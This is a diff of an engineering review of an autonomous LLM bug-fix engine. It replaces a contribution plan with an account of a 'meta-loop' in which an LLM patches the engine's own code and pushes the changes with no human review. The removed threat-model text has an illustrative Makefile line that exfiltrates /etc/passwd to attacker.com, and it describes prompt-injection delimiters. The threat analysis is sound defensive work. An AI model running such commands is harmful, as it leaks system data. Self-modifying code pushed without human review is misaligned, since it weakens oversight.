@@ -1,4 +1,4 @@
-# rl-bug-fix-full-send: Complete Review & fullsend Contribution Plan
+# rl-bug-fix-full-send: Complete Review & fullsend Contribution
 
 **Date:** 2026-03-29
 **Production run reviewed:** [GitHub Actions #27](https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23720361026)
@@ -36,7 +36,7 @@ The engine was **built by an agentic loop itself** — 68 iterations of the "ral
 
 ```
 ┌─────────────────────────────────────────┐
-│ GitHub Actions Workflow (ralph-loop.yml) │
+│ GitHub Actions Workflow (rl-engine.yml)  │
 ├────────────────┬────────────────────────┤
 │  Agent Job     │  Observer Job          │
 │  ┌──────────┐  │  ┌──────────────────┐  │
@@ -53,7 +53,7 @@ The engine was **built by an agentic loop itself** — 68 iterations of the "ral
 └────────────────┴────────────────────────┘
 ```
 
-Each phase subclasses `Phase` and implements an **OODA cycle** (observe → plan → act → validate → reflect). The loop (`RalphLoop`) manages phase transitions, backtracking on review rejection, escalation caps, exponential backoff, time budgets, and execution recording.
+Each phase subclasses `Phase` and implements an **OODA cycle** (observe → plan → act → validate → reflect). The loop (`PipelineEngine`) manages phase transitions, backtracking on review rejection, escalation caps, exponential backoff, time budgets, and execution recording.
 
 ### The Good
 
@@ -86,9 +86,9 @@ Single pass through all phases (no retries, no escalation), 4 LLM calls, ~29K to
 The landing page of `report.html` shows "Files Modified: 0" and "Tests Run: 0" while the narrative section describes actual file changes and a PR. "Total Time" shows "—" despite timestamps being available. For a report meant to give stakeholders confidence, **incorrect zero values are worse than no values**. This is the first thing someone sees and it erodes trust in everything below it.
 
 **2. Workflow output wiring is incomplete**
-The `ralph-loop.yml` declares `outputs.pr_number` and `outputs.repo` on the agent job, but the "Run Ralph Loop Engine" step only writes `status` to `$GITHUB_OUTPUT`. The observer job's "Post policy result to PR" step depends on `pr_number` being set — so it **never runs**, even on successful PR-producing runs. The observer attestation gets uploaded as an artifact but never reaches the PR as a comment.
+The `rl-engine.yml` declares `outputs.pr_number` and `outputs.repo` on the agent job, but the "Run RL Engine" step only writes `status` to `$GITHUB_OUTPUT`. The observer job's "Post policy result to PR" step depends on `pr_number` being set — so it **never runs**, even on successful PR-producing runs. The observer attestation gets uploaded as an artifact but never reaches the PR as a comment.
 
-**3. `RalphLoop` is a god object**
+**3. `PipelineEngine` is a god object**
 `engine/loop.py` handles: phase orchestration, backtracking, escalation, the CI monitoring sub-loop, CI remediation dispatch, PR detection, branch extraction, repo URL parsing, and execution recording. It works, but it's one refactor away from being unmanageable. The CI monitoring sub-loop in particular should be its own module.
 
 **4. Duplicated constants are drift hazards**
@@ -156,231 +156,187 @@ The bug was an intermittent failure in `fbc-fips-check-oci-ta` (a Tekton StepAct
 
 ---
 
-## Part 3: fullsend Contribution Plan
+## Part 3: The Meta-Loop Experiment — Feeding a Bug Fix Engine's Results Back to an LLM to Improve the Engine
 
-### Experiment: End-to-End Bug Fix Engine with Phased Pipeline and Neutral Observer
+### Artifacts
 
-This is the primary deliverable — a write-up of what rl-bug-fix-full-send built and learned, formatted for `experiments/` in fullsend.
+Everything described below is public. Click through to see the actual runs, commits, and PRs.
 
-**Proposed file:** `experiments/005-bug-fix-engine-phased-pipeline.md`
+| Artifact | Link |
+|----------|------|
+| Repository | [ascerra/rl-bug-fix-full-send](https://github.com/ascerra/rl-bug-fix-full-send) |
+| Target issue | [nonflux/build-definitions#1](https://github.com/nonflux/build-definitions/issues/1) |
+| Run #26 (success) | [23618411249](https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23618411249) |
+| PR #3 (first engine-produced PR) | [nonflux/build-definitions#3](https://github.com/nonflux/build-definitions/pull/3) |
+| PR #4 (from run #26) | [nonflux/build-definitions#4](https://github.com/nonflux/build-definitions/pull/4) |
+| Auto-fix #1: scope creep | [`e06bd71`](https://github.com/ascerra/rl-bug-fix-full-send/commit/e06bd71) |
+| Auto-fix #2: truncation 5k→50k | [`4e2623b`](https://github.com/ascerra/rl-bug-fix-full-send/commit/4e2623b) |
+| Auto-fix #3: missing git commit | [`f13e984`](https://github.com/ascerra/rl-bug-fix-full-send/commit/f13e984) |
+| Auto-fix #4: unique branch names | [`1a1c56b`](https://github.com/ascerra/rl-bug-fix-full-send/commit/1a1c56b) |
+| All commit history | [ascerra/rl-bug-fix-full-send/commits/main](https://github.com/ascerra/rl-bug-fix-full-send/commits/main/) |
+| All workflow runs | [ascerra/rl-bug-fix-full-send/actions](https://github.com/ascerra/rl-bug-fix-full-send/actions) |
 
-```markdown
-# Experiment 005: End-to-End Bug Fix Engine with Phased Pipeline and Neutral Observer
+### The Engine Works on Any Repo Without Changing It
 
-**Date:** 2026-03-29
-**Status:** Completed
-**Relates to:** intent-representation, security-threat-model, code-review,
-  autonomy-spectrum, testing-agents, agent-architecture, repo-readiness
+Most agent tooling requires the target repository to opt in — install a GitHub App, add a config file, label issues a certain way, configure permissions. The RL Bug Fix Engine doesn't. It's a single GitHub Actions workflow that contains the entire bug fix pipeline: read the issue, clone the repo, analyze the code, write a fix, review it, and open a cross-fork PR. All in one workflow run.
 
-## Hypothesis
+The target repo owners don't set anything up. They don't install anything. A PR shows up on their repo like any other contribution. They review it, merge it or don't — the same workflow they already have for human contributors. The engine reads their code and issues through public APIs and git, operates on repositories it has never seen before, and requires zero coordination from the people who maintain them.
 
-A single-process phased pipeline (triage → implement → review → validate → report)
-with bounded backtracking, per-phase tool restrictions, and a post-hoc neutral observer
-can autonomously produce correct, mergeable bug fixes for real GitHub issues — without
-human intervention during execution — while providing sufficient observability and
-attestation for human oversight after the fact.
+### The Core Idea
 
-Secondary hypothesis: the engine itself can be developed by an agentic loop (Cursor
-agent CLI running against an implementation plan), with a meta-loop providing production
-feedback to close the development cycle.
+When the engine runs, it produces artifacts — execution traces, review findings, phase results, error messages, and the PRs it created. These artifacts contain everything about *how* the engine approached the problem, *what* it tried, *why* it failed or succeeded, and *what the fix looked like*. If you feed all of that back to an LLM — not just the error, but the full history of decisions and outcomes — it can do more than patch a crash. It can rethink the strategy: should the prompts give different guidance? Was the context too limited for the engine's LLM to reason correctly? Did the workflow skip a step that only matters in production? The LLM isn't just fixing failures — it's reviewing the engine's past solutions to improve how the engine solves future problems.
 
-## Setup
+There are two separate things running in two separate places:
 
-### Engine architecture
-- **Runtime:** Python 3.12, single-process, runs in GitHub Actions
-- **Phases:** triage, implement, review, validate, report — each with OODA cycle
-  (observe/plan/act/validate/reflect) and phase-specific tool allowlists
-- **Backtracking:** Review can reject back to implement, bounded by escalation cap
-- **CI remediation:** Post-PR sub-loop monitors CI, categorizes failures, auto-fixes or reruns
-- **Observer:** Separate CI job — reconstructs execution, cross-checks claims, signs attestation
-- **LLM providers:** Gemini 2.5 Pro (primary), Anthropic (fallback)
-- **Target:** Cross-fork PRs (engine repo triggers workflow, pushes fix branch to fork, opens PR against upstream)
+1. **The RL Bug Fix Engine** — a GitHub Actions workflow that runs entirely in CI. Each run is a complete end-to-end bug fix attempt: it reads the issue, clones the target repo, analyzes the code, writes a fix, self-reviews it, and opens a cross-fork PR. Five phases (triage, implement, review, validate, report), no human intervention. **The target repository doesn't need any configuration, labels, bot integrations, or code changes to support this** — you just point the engine at an issue URL and it works.
 
-### Development methodology
-- 68 iterations of "ralph loop" (Cursor agent CLI + implementation plan)
-- Meta-loop for production: trigger workflow → monitor → download artifacts → analyze → auto-fix → push
-- 14+ production runs against nonflux/build-definitions#1
+2. **The meta-loop** — a local script (`scripts/meta-loop.sh` + `scripts/meta_loop_agent.py`) that I ran on my machine. It triggers a full engine run in GitHub Actions, waits for it to finish, downloads the execution artifacts, and feeds them to an LLM. The LLM reviews how the engine approached the problem, what went wrong, and generates patches to the engine's own source code (prompts, phase logic, workflow config). Then the script pushes those changes and kicks off another complete engine run to see if the fix worked.
 
-### Scale
-- 106 Python source files, ~61,500 lines total
-- 53 engine modules, 49 test files, 2,983 tests
-- 6 prompt templates, 10 ADRs, 3 output formats (JSON, HTML, Markdown)
-
-## Results
-
-### Production run (representative)
-- **Issue:** Intermittent race condition in parallel Tekton StepAction (fbc-fips-check-oci-ta)
-- **Outcome:** SUCCESS — correct fix in single pass, no retries, no escalation
-- **Cost:** 4 LLM calls, 29K tokens, 3-minute wall clock
-- **Fix quality:** Review approved with one minor nit (pre-existing cleanup gap, not introduced)
-
-### What worked
-
-1. **Phased pipeline with tool restrictions** — triage can't write, implement can't push,
-   review is read-only. This enforces separation of concerns at the tool level, not just
-   the prompt level. Phases can't accidentally do things outside their scope.
-
-2. **Bounded backtracking** — Review rejection sends back to implement with findings
-   context. Escalation cap prevents infinite loops. In practice, most fixes pass review
-   on first or second attempt.
-
-3. **Untrusted content handling** — Every prompt template wraps external content
-   (issue text, file contents, CI logs) in explicit delimiters with instructions to
-   treat it as data, not instructions. Prompt injection test suite validates this boundary.
-
-4. **Structured output** — JSON execution record as source of truth, HTML report for
-   humans, summary.md for GitHub Step Summary, transcripts for audit. The dual-format
-   approach satisfies both automation and human review needs.
-
-5. **Neutral observer** — Post-hoc reconstruction and cross-checking from artifacts
-   provides an independent verification layer. Sigstore signing ties attestations to
-   the CI identity, not a long-lived key.
-
-6. **Meta-loop development** — The engine was built by an agentic loop and tested by a
-   production feedback loop. The git log contains commits like "meta-loop: auto-fix
-   after run XXXXX" where the agent diagnosed production failures and patched the engine.
-   This validates the "agents building agent infrastructure" pattern.
-
-### What didn't work (or needs work)
-
-1. **Report metric bugs** — Landing page showed "Files Modified: 0" and "Tests Run: 0"
-   despite actual changes. Dashboard credibility is critical for stakeholder trust and
-   this was the most visible failure.
-
-2. **Workflow output wiring** — The observer's PR comment step depends on `pr_number`
-   being set as a job output, but the agent step never writes it. The observer runs and
-   produces attestation artifacts, but can't post them to the PR.
-
-3. **No local test execution** — The validate phase relies on target repo CI for
-   correctness validation. The engine doesn't run the target repo's tests locally before
-   pushing. For simple fixes this is fine; for complex changes it's risky.
-
-4. **Heuristic CI categorization** — Keyword-based failure classification works for
-   common patterns but will misclassify novel failures. No learning or adaptation.
-
-5. **shell_run is an RCE surface** — The implement phase can execute arbitrary commands
-   in the target repo. Mitigated by path restrictions and redaction but not by container
-   isolation or seccomp. A malicious repo could exploit this.
-
-6. **Observer is post-hoc** — Detects inconsistency but cannot prevent damage during
-   the agent job. A compromised agent could push bad code before the observer runs.
-
-## Learnings for fullsend
-
-### For intent-representation
-Bug fix intent is relatively easy to express (issue description + affected files), but
-**scope control** is hard. The implement phase sometimes wants to fix adjacent issues
-it discovers. The review phase must enforce "did you fix the bug described in the issue,
-and only that bug?" Scope checking needs to be explicit in review criteria.
-
-### For security-threat-model
-The biggest real risk we encountered was not prompt injection (the delimiter approach
-works well in practice) but **tool misuse** — the agent running commands in the target
-repo that have unintended side effects. The second biggest risk is **stale mocks** — all
-external APIs are mocked in tests, so a breaking API change won't be caught until
-production. Contract tests or API schema validation would close this gap.
-
-### For code-review
-Self-review (the engine reviewing its own output) is weaker than it appears. The review
-phase has access to the same context as implement, which means it shares the same blind
-spots. The neutral observer provides a second perspective but only post-hoc. A stronger
-architecture would have the review phase use a different model or different context window.
-
-### For autonomy-spectrum
-The engine's escalation logic (cap on review rejections, time budget, CI remediation
-cap) works as a **fail-closed** mechanism — when the agent can't make progress, it stops
-and reports rather than looping forever. This is the right default. The caps should be
-configurable per-repo based on repo readiness signals.
-
-### For testing-agents
-2,983 tests sound impressive but they're all **structural/behavioral** — they test that
-the engine does what the code says, not that the engine produces good fixes. The real
-eval is the production run outcome, which requires a benchmark suite of known-good bug
-fixes. The promptfoo-eval experiment in fullsend is closer to the right approach.
-
-### For repo-readiness
-Target repos without good CI give the engine nothing to validate against. The validate
-phase becomes "does it compile?" which is a low bar. The engine implicitly requires
-target repos to have CI that catches the class of bug being fixed. This should be a
-documented prerequisite.
-
-## Artifacts
-
-- Repository: https://github.com/ascerra/rl-bug-fix-full-send
-- Production run: https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23720361026
-- HTML report: available as workflow artifact (ralph-loop-reports-*)
-- Engine docs: ARCHITECTURE.md, SPEC.md, 10 ADRs in-repo
+```
+[local machine]                              [GitHub Actions]
+meta-loop.sh                                 RL Bug Fix Engine
+    │                                             │
+    ├─ trigger workflow ─────────────────────────►│ full e2e bug fix run
+    │                                             │ (triage → implement → review
+    │                                             │  → validate → push PR → report)
+    │◄─ download execution artifacts ─────────────┤
+    │                                             │
+    ├─ LLM reads full trace                       │
+    │  (how the engine reasoned, what it tried,   │
+    │   what the fix looked like, why it failed)  │
+    │                                             │
+    ├─ patch engine source code                   │
+    ├─ push changes                               │
+    ├─ trigger next workflow ────────────────────►│ another full e2e bug fix run
+    │                                             │
+    └─ repeat until success                       │
 ```
 
-### Issues to File or Contribute To on fullsend-ai/fullsend
+Each arrow labeled "trigger workflow" kicks off a **complete, independent bug fix attempt** — not a retry of a failed step, but the whole pipeline from scratch against the target issue. The meta-loop isn't fixing the bug; it's fixing the *engine* so the next full run gets it right.
 
-**Contribute to existing issues (comment with findings + link to experiment):**
+### How the Loop Got It Working
 
-**1. #68 — "Define the MVP bugfix workflow"**
-rl-bug-fix-full-send IS an implemented MVP bugfix workflow. The issue asks for a `docs/mvp.md` describing the end-to-end flow. We can contribute concrete findings: the phase sequence (triage → implement → review → validate → report), per-phase tool restrictions, escalation logic, and production results demonstrating it works. This is empirical input for the document they want to write, not the document itself.
+The target issue was [nonflux/build-definitions#1](https://github.com/nonflux/build-definitions/issues/1) — an intermittent race condition in a Tekton StepAction where parallel image processing used shared temp directories. The meta-loop was launched in continuous mode with `--auto-push`, meaning: if the LLM diagnoses the problem and generates a patch, the script commits it, pushes it, and triggers the next run automatically. No human in the loop.
 
-**2. #85 — "Experiment: implement-review agent loop with iterative feedback"**
-This issue asks for an experiment validating the implement-review loop with structured feedback. We built exactly this: review returns findings with categories, implement receives them as context on retry, bounded by escalation cap. We can answer their open questions directly:
-- Feedback format: structured JSON with verdict, findings array, severity, dimension
-- Convergence: most fixes pass in 1-2 iterations; oscillation prevented by escalation cap
-- Termination: reviewer approval OR max iterations (configurable), then escalation
-- History: implementer sees previous attempt findings (not full history) to keep context lean
-Our experiment is the result they're looking for. Comment with results and link to experiment doc.
+```bash
+./scripts/meta-loop.sh \
+  --issue-url "https://github.com/nonflux/build-definitions/issues/1" \
+  --fork-repo "ascerra/build-definitions" \
+  --provider gemini \
+  --continuous \
+  --max-runs 10 \
+  --auto-push
+```
 
-**3. #86 — "Define triage agent fix scope strategy"**
-Our triage phase defaults to narrow fix, but scope creep during implement was a real problem. The review phase enforces "did you fix only the stated bug?" as a check. This is data supporting the issue's "narrow fix + derivative issues" option. Comment with our experience: scope-checking in review works as a backstop but needs explicit criteria.
+Four autonomous self-corrections happened in sequence:
 
-**4. #78 — "Choose and implement a sandbox layer for agent runs"**
-This issue already covers fs isolation, network isolation, per-run configuration, and provenance recording in detail. Our concrete finding: `shell_run` in the implement phase is the highest-risk tool because it executes arbitrary commands in the target repo. Without container isolation the only protection is path restrictions in the tool executor. Comment with: what we implemented (path allowlists, redaction), what we didn't (container isolation, seccomp, network namespacing), and where it fell short. Do NOT file a duplicate sandbox issue.
+**Auto-fix #1 — Scope creep in implement phase**
 
-**5. #102 — "Ensure that comments by agents can be trusted"**
-This issue discusses GPG/SSH signing of agent-generated comments on issues/PRs. Our observer uses Sigstore/cosign signing of execution attestation artifacts — a different granularity (execution-level vs comment-level) but the same trust problem. Comment with: the attestation approach (in-toto payload, OIDC identity, Sigstore signing) and the finding that the observer's PR comment step never fires because `pr_number` isn't wired through workflow outputs. Also note that attestation signing and comment signing are complementary, not alternatives.
+| | |
+|---|---|
+| **Failed run** | [23613985882](https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23613985882) @ [`40b7e95`](https://github.com/ascerra/rl-bug-fix-full-send/commit/40b7e95) |
+| **What happened** | The review agent rejected the fix because the implement agent added unrelated changes (scope creep). The implement-review loop hit the escalation cap without converging. |
+| **LLM diagnosis** | The LLM read the [execution JSON](https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23613985882) (downloadable as a workflow artifact from every run), saw repeated review rejections with findings about out-of-scope changes, and identified that the implement prompt had no guidance about staying in scope when review feedback flagged it. |
+| **Auto-fix commit** | [`e06bd71`](https://github.com/ascerra/rl-bug-fix-full-send/commit/e06bd71) — Strengthened the implement agent's prompt with a scope creep warning, added a `_check_path_consistency()` safety net to the review agent, improved the review prompt template. |
+| **Files changed** | `engine/phases/implement.py`, `engine/phases/review.py`, `engine/config.py`, `templates/prompts/review.md` |
 
-**New issues to file (verified these don't duplicate existing):**
+**Auto-fix #2 — File content truncation broke generated code**
 
-**6. New issue: "Report/dashboard metric accuracy as a trust requirement"**
-No existing issue covers this. Framing: agent autonomy requires human trust. Reports with incorrect zero values ("Files Modified: 0" when implement succeeded) actively erode that trust. The report is often the only artifact stakeholders see. Propose: metric validation in report generation (assert files_modified > 0 when implement phase succeeded), report regression tests with golden output, and treat dashboard bugs as high-severity. Links to autonomy-spectrum.md (trust signals) and human-factors.md (stakeholder confidence).
+| | |
+|---|---|
+| **Failed run** | [23614415889](https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23614415889) @ [`e06bd71`](https://github.com/ascerra/rl-bug-fix-full-send/commit/e06bd71) |
+| **What happened** | The implement agent truncated file content at 5,000 characters before sending it to the LLM. The target file was larger than 5k, so the LLM received a cut-off file and generated broken code with syntax errors. The review agent correctly rejected the broken output, but the implement agent kept receiving the same truncated input, creating an infinite rejection loop. |
+| **LLM diagnosis** | Read the review findings (syntax errors, unterminated functions), correlated with the file sizes in the execution record, and identified the 5k truncation limit as the root cause. |
+| **Auto-fix commit** | [`4e2623b`](https://github.com/ascerra/rl-bug-fix-full-send/commit/4e2623b) — Increased file content truncation from 5,000 to 50,000 characters in both `engine/phases/implement.py` and `engine/phases/review.py`. |
+| **Files changed** | `engine/phases/implement.py` (+1 −1), `engine/phases/review.py` (+1 −1) |
 
-**7. New issue: "Contract tests for LLM and GitHub API integrations"**
-No existing issue covers this. Framing: in rl-bug-fix-full-send, all external API interactions (Gemini, Anthropic, GitHub) are mocked in tests. Breaking API changes are invisible until production. The meta-loop catches failures but the feedback cycle is slow (trigger → wait → download → diagnose → patch → push ≈ 30+ minutes). Propose: lightweight contract test approach (recorded responses with schema validation, periodic live-API smoke tests in CI). Links to testing-agents.md (eval vs integration testing) and repo-readiness.md (CI maturity).
+**Intermediate success + manual fixes**
 
-**8. New issue: "Observer timing gap — post-hoc attestation vs real-time prevention"**
-No existing issue covers the observer timing problem specifically. #102 is about comment trust (signing); this is about the architectural gap where a post-hoc observer cannot prevent damage during the agent job. Framing: rl-bug-fix-full-send implements a neutral observer (separate CI job, artifact reconstruction, cross-checking, signed attestation) that runs *after* the agent completes. A compromised agent can push bad code, exfiltrate secrets, or modify the repo before the observer runs. Propose discussing architectures for real-time guardrails (tool-call approval gateway, sidecar observer, pre-push hook) alongside post-hoc attestation. Links to security-threat-model.md (agent drift, supply chain) and agent-architecture.md (agent authority boundaries).
+Run [23615068030](https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23615068030) @ [`4e2623b`](https://github.com/ascerra/rl-bug-fix-full-send/commit/4e2623b) succeeded partially — the engine got through all agents but the validate agent had logging issues. Two manual fixes followed:
+- [`a0cc93c`](https://github.com/ascerra/rl-bug-fix-full-send/commit/a0cc93c) — Fixed validate phase error logging
+- [`6236e49`](https://github.com/ascerra/rl-bug-fix-full-send/commit/6236e49) — Made validate phase fail properly when PR creation fails
 
-### Problem Doc Contributions
+**Auto-fix #3 — Implement didn't commit changes before validate**
 
-**1. `testing-agents.md` — Add subsection under existing "Golden-set evaluation" or new subsection: "Empirical finding: structural tests vs outcome evals"**
-The doc already has deep sections on golden-set evaluation (Approach 1) and behavioral contract testing (Approach 2). Our contribution adds empirical data, not a new approach: 2,983 structural tests verify the engine behaves as coded, but zero tests verify it produces *good* fixes. The real eval is the production run outcome. This maps to the doc's existing observation about "coverage question" — how do you know the golden set is sufficient? Our finding: you don't, and structural tests give false confidence. Propose adding: a subsection on the structural-vs-outcome gap with concrete numbers, and a reference to the promptfoo-eval experiment (004) as closer to the right approach for outcome eval. Also propose: benchmark suite of known-good bug fixes (issue + human fix + automated fix, scored on correctness/scope/side-effects) as a specific golden-set format for bug-fix agents.
+| | |
+|---|---|
+| **Failed run** | [23616933542](https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23616933542) @ [`6236e49`](https://github.com/ascerra/rl-bug-fix-full-send/commit/6236e49) |
+| **What happened** | The implement agent wrote file changes to the working directory but never ran `git commit`. When the validate agent tried to push the branch and create a PR, there were no committed changes to push. |
+| **LLM diagnosis** | Read the execution trace showing the implement agent succeeded (files written) but the validate agent failed (nothing to push). Identified the missing git commit step. |
+| **Auto-fix commit** | [`f13e984`](https://github.com/ascerra/rl-bug-fix-full-send/commit/f13e984) — Added a git commit step to the implement agent's workflow after file writes succeed. |
+| **Files changed** | `engine/phases/implement.py` (+19) |
 
-**2. `security-threat-model.md` — Add subsection under Threat 1 or as new Threat 5: "Tool misuse via target repo content"**
-The doc covers prompt injection (Threat 1) extensively, including steganographic/invisible Unicode attacks. Our finding adds a distinct vector: the agent executing shell commands derived from target repo content. This is NOT prompt injection — the agent's prompts are fine, but the agent reads a Makefile target, a CI script, or a file path containing shell metacharacters and executes them. The agent is following instructions correctly; the repo content is the weapon. A `Makefile` with `test: ; curl attacker.com/$(cat /etc/passwd)` would be executed faithfully by an implement phase running `make test`. This is closer to supply chain (Threat 4) than injection (Threat 1) but deserves its own subsection because the attack surface is different: it exploits the tool layer, not the LLM layer.
+**First fully successful run → [PR #3](https://github.com/nonflux/build-definitions/pull/3)**
 
-**3. `code-review.md` — Add subsection: "Empirical evidence for decomposition from monolithic review"**
-The doc already makes a strong case for sub-agent decomposition (context window argument, defense-in-depth argument, specialization argument). Our contribution adds empirical evidence supporting their recommendation: rl-bug-fix-full-send uses a *single monolithic* review phase (the opposite of what code-review.md recommends). Concrete finding: self-review with one model and similar context shares blind spots with the implementation phase — review approved fixes that a human reviewer later found had scope creep. The review phase catches syntax, correctness, and obvious issues but misses higher-order concerns (scope drift, architectural fit). This directly validates the doc's defense-in-depth argument: a single reviewer is a single point of failure. The neutral observer partially compensates (post-hoc, different context) but is not a substitute for decomposed sub-agents during review.
+Run [23617134590](https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23617134590) @ [`f13e984`](https://github.com/ascerra/rl-bug-fix-full-send/commit/f13e984) — **SUCCESS**. The triage agent identified the root cause, the implement agent wrote a fix (unique per-image temp paths), the review agent approved it, the validate agent committed and pushed, and created [PR #3 on nonflux/build-definitions](https://github.com/nonflux/build-definitions/pull/3). This was the first real PR the engine ever produced.
 
-### ADR to Propose
+**Grading the engine's PR against the real human fix**
 
-**ADR: Dual-loop development methodology for agent infrastructure**
+After PR #3, I had Cursor read the engine's fix ([run 23617134590](https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23617134590)), then read the actual human-authored fix for the same bug — [PR #3057 on konflux-ci/build-definitions](https://github.com/konflux-ci/build-definitions/pull/3057) by zxiong, which had already been merged upstream. The goal was to compare the engine's output against what a human engineer actually shipped.
 
-The rl-bug-fix-full-send development used two loops:
-1. **Inner loop (ralph loop):** Cursor agent CLI executing against an implementation plan, building the engine locally, running tests
-2. **Outer loop (meta-loop):** Triggering the engine in CI against a real issue, downloading artifacts, analyzing results, auto-patching the engine, pushing, repeating
+Both used the same strategy — adding a unique `image_num` to temp paths. The engine matched the human's approach and arrived at it in 2.8 minutes autonomously, with better documentation (comprehensive PR body with root cause analysis and testing plan). But the human fix was more precise: the engine dropped `:latest` from the OCI cleanup path, which the human kept consistent across all operations. The engine's self-review (0 findings) failed to catch this subtle inconsistency.
 
-This is "agents building agent infrastructure with production feedback." It worked — 68 inner iterations and 14+ outer iterations produced a working engine. But it also has risks: the inner loop agent can introduce subtle bugs that only manifest in production, and the outer loop's auto-fix mode can commit patches without human review.
+| | Human Fix ([PR #3057](https://github.com/konflux-ci/build-definitions/pull/3057)) | Engine Fix ([PR #3](https://github.com/nonflux/build-definitions/pull/3)) |
+|---|---|---|
+| **Grade** | **A** | **A-** |
+| Root cause | A | A+ (detailed, precise explanation) |
+| Code quality | A+ (perfectly consistent paths) | A- (correct strategy, but `:latest` dropped in cleanup) |
+| Scope | A+ (minimal) | A+ (minimal) |
+| Documentation | B+ (clear but terse) | A+ (comprehensive PR body) |
+| Speed | C (hours to merge) | A+ (2.8 min autonomous) |
+| Review depth | N/A | B (missed path consistency) |
 
-**Propose as Undecided** with options:
-1. Dual-loop with human gates (current approach minus `--auto-push`)
-2. Dual-loop fully autonomous (current approach with `--auto-push`)
-3. Single-loop only (no agentic inner development, only production feedback)
+This comparison led to concrete improvements, committed as [`98144ad`](https://github.com/ascerra/rl-bug-fix-full-send/commit/98144ad):
 
-Relates to: autonomy-spectrum, testing-agents, human-factors
+| Finding | Engine improvement |
+|---------|-------------------|
+| The review agent missed the `:latest` path inconsistency between creation and cleanup | Added review dimension #6: "Consistency of Paired Operations" to the review prompt. Added a deterministic `_check_path_consistency()` safety net in the review agent that regex-extracts paths from shell scripts and detects OCI tag mismatches — this would have caught the exact bug. |
+| The implement agent didn't maintain exact path patterns across paired operations | Added "Consistency Requirements" section to the implement prompt — maintain path patterns across create/cleanup, follow parameter ordering conventions, verify all call sites |
 
----
+These were also added to the implementation plan and built into the engine during the final ralph loop session. This is the kind of improvement the meta-loop itself could produce if configured to review successful runs and their PRs, not just failures.
 
-## Summary
+**Auto-fix #4 — Branch name collision**
 
-**What we proved:** A phased pipeline engine can autonomously produce correct bug fixes for real GitHub issues, with sufficient observability for post-hoc human oversight. The meta-loop development methodology (agents building agent infrastructure) is viable but needs guardrails.
+| | |
+|---|---|
+| **Failed run** | [23618209219](https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23618209219) @ [`98144ad`](https://github.com/ascerra/rl-bug-fix-full-send/commit/98144ad) |
+| **What happened** | The validate agent tried to push to branch `rl/fix`, but that branch already existed from PR #3. The push failed with a conflict. |
+| **LLM diagnosis** | Read the validate agent's error (push rejection), identified that branch names were hardcoded and would collide on repeat runs. |
+| **Auto-fix commit** | [`1a1c56b`](https://github.com/ascerra/rl-bug-fix-full-send/commit/1a1c56b) — Generate unique branch names with UUID suffix (e.g., `rl/fix-1-3f3b380e`). |
+| **Files changed** | `engine/phases/validate.py` (+13 −4) |
 
-**What we didn't prove:** That the engine produces good fixes consistently across diverse bug types, repos, and languages. One successful production run on one issue is a proof of concept, not a proof of reliability. A benchmark suite is the next step.
+**Second successful run → [PR #4](https://github.com/nonflux/build-definitions/pull/4)**
 
-**For fullsend:** This experiment directly contributes to 5 existing issues (#68, #85, #86, #78, #102), adds 3 genuinely new issues (report accuracy, contract tests, observer timing gap), proposes 3 problem doc contributions with empirical evidence (testing-agents, security-threat-model, code-review), 1 experiment write-up, and 1 ADR proposal. All verified against existing fullsend content to avoid duplication.
+[**Run #26** (23618411249)](https://github.com/ascerra/rl-bug-fix-full-send/actions/runs/23618411249) @ [`1a1c56b`](https://github.com/ascerra/rl-bug-fix-full-send/commit/1a1c56b) — **SUCCESS** in 6 minutes. Produced [PR #4](https://github.com/nonflux/build-definitions/pull/4) on branch `rl/fix-1-3f3b380e`.
+
+### The Self-Improvement Pattern
+
+Here is what makes this interesting as an experiment:
+
+**1. Each auto-fix addressed a genuinely different category of bug:**
+
+| Auto-fix | Category | What the LLM identified |
+|----------|----------|----------------------|
+| #1 ([`e06bd71`](https://github.com/ascerra/rl-bug-fix-full-send/commit/e06bd71)) | Prompt design | The implement agent's prompt needed scope constraints when the review agent flags drift |
+| #2 ([`4e2623b`](https://github.com/ascerra/rl-bug-fix-full-send/commit/4e2623b)) | Context window | 5k char file limit was too small for the implement agent to work with real-world files |
+| #3 ([`f13e984`](https://github.com/ascerra/rl-bug-fix-full-send/commit/f13e984)) | Missing step | The implement agent wrote files but never committed them |
+| #4 ([`1a1c56b`](https://github.com/ascerra/rl-bug-fix-full-send/commit/1a1c56b)) | State management | Hardcoded branch names collide on repeated runs |
+
+**2. The LLM had real signal to work with.** The engine produces structured execution artifacts (JSON with phase results, review findings, error traces, iteration counts). The LLM received ~350k characters of context per diagnosis call. This isn't a vague "it failed" — it's a detailed execution trace that lets the LLM reason about *why* the engine failed.
+
+**3. The fixes were small and correct.** Auto-fix #2 changed 2 lines. Auto-fix #4 changed 17 lines. The LLM wasn't rewriting the engine; it was making targeted, surgical fixes based on specific evidence from the execution trace.
+
+**4. The loop discovered bugs that testing couldn't.** 2,983 unit tests all passed before any production run. The failures were integration-level: real file sizes exceeding limits, real git branches colliding, missing workflow steps that only matter in a real CI environment. These bugs only manifest when the full system runs against real repositories — exactly the environment the meta-loop provides.
+
+### What This Means
+
+The meta-loop demonstrates a concrete pattern: **production execution as a feedback signal for improving the engine**. You don't need human-written evals or curated benchmarks. You need:
+
+1. **Structured execution artifacts** — not just "pass/fail" but detailed traces of what happened and why
+2. **An LLM** that can read those artifacts and propose targeted fixes to the engine
+3. **A script** that applies the fixes, pushes, and re-runs the engine to verify them
+
+The four auto-fix commits took the engine from "fails on every real repo" to "produces correct PRs in a single pass." The total time from first meta-loop run to first successful PR was about 90 minutes of wall clock (most of which was CI execution time, not human effort).
+
+Two findings from this experiment: the meta-loop pattern works for improving an engine using its own production results, and the engine itself proves you can build a fully autonomous bug fix system as a single workflow that operates on any repo without requiring the target to change anything.
+
